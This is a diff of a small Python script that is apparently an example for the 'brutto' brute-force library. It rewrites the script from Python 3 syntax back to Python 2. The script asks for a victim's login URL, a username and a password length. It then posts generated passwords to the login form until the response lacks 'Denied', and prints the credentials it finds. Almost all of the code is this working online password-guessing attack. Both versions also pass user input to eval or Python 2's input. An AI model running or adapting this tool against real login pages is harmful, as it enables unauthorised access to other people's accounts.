@@ -8,8 +8,8 @@
 import os         #
 import re         #
 import sys        #
-import urllib.request, urllib.parse, urllib.error     #
-import urllib.request, urllib.error, urllib.parse    #####################
+import urllib     #
+import urllib2    #####################
 from brutto_easy import Brutto        #
 #######################################
 #
@@ -41,19 +41,19 @@ color = {"blue": "\033[94m", "green": "\033[92m", "white": "\033[0m", "red": "\0
 
 def main():
 
-    print("\t\t---------------" + color['green'] + "login" + color['white'] + "--------------")
-    print("\t\tx      Developed by " + color['blue'] + "@jofpin" +  color['white'] + "      x")
-    print("\t\tx      Example of brutto.py      x")
-    print("\t\t----------------------------------\n\n")
+    print "\t\t---------------" + color['green'] + "login" + color['white'] + "--------------"
+    print "\t\tx      Developed by " + color['blue'] + "@jofpin" +  color['white'] + "      x"
+    print "\t\tx      Example of brutto.py      x"
+    print "\t\t----------------------------------\n\n"
 
     # URL of the login of the victim
-    host = input("Insert Target -> ")
+    host = raw_input("Insert Target -> ")
 
     # Username of login
-    username = input("Username: ")
+    username = raw_input("Username: ")
 
     # total value of password or total of characters example: 5
-    valuePass = eval(input("Value password: "))
+    valuePass = input("Value password: ")
 
     # brutto relation
     bruteforce = Brutto()
@@ -64,11 +64,11 @@ def main():
 	formData = [(inputUser, username), (inputPass, password)]
 
 	# Runner process tan tan
-	print(color['white'] + "> " + color['blue'] + "Brutting: " + color['green'], password + color['white'])
+	print color['white'] + "> " + color['blue'] + "Brutting: " + color['green'], password + color['white']
 
-	login = urllib.parse.urlencode(formData)
+	login = urllib.urlencode(formData)
 
-	opener = urllib.request.build_opener()
+	opener = urllib2.build_opener()
 
 	core = opener.open(host, login).read()
 
@@ -78,9 +78,9 @@ def main():
 
 
 	if re.search("Denied", core) == None:
-		print("\n[" + color['green'] + "+" + color['white'] + "]" + color['blue'] + " Successful Brutting!\n")
-		print(color['white'] + "[" + color['blue'] + "+" + color['white'] + "]" + color['yellow'] + " Username:" + color['white'], username)
-		print(color['white'] + "[" + color['blue'] + "+" + color['white'] + "]" + color['yellow'] + " Password:" + color['white'], password)
+		print "\n[" + color['green'] + "+" + color['white'] + "]" + color['blue'] + " Successful Brutting!\n"
+		print color['white'] + "[" + color['blue'] + "+" + color['white'] + "]" + color['yellow'] + " Username:" + color['white'], username
+		print color['white'] + "[" + color['blue'] + "+" + color['white'] + "]" + color['yellow'] + " Password:" + color['white'], password
 		break
 
 if __name__ == "__main__":
